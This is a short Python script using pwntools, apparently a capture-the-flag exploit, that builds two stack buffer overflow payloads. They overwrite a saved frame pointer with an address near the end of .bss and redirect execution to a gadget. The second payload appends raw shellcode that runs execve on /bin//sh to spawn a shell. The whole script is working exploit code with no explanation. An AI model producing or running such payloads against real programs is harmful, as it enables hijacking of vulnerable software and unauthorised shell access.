#!/usr/bin/python3

from pwn import *
end_bss_address = 0x403000
lea_rdi_var_8h = p64(0x00401015)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


#1st iteration
payload_0 = b"A"*8 + p64(end_bss_address+0x8) + lea_rdi_var_8h 
print(payload_0)

#2nd iteration
payload_1 = b"A"*8 + b"B"*8 + p64(end_bss_address+0x18) + shellcode
print(payload_1)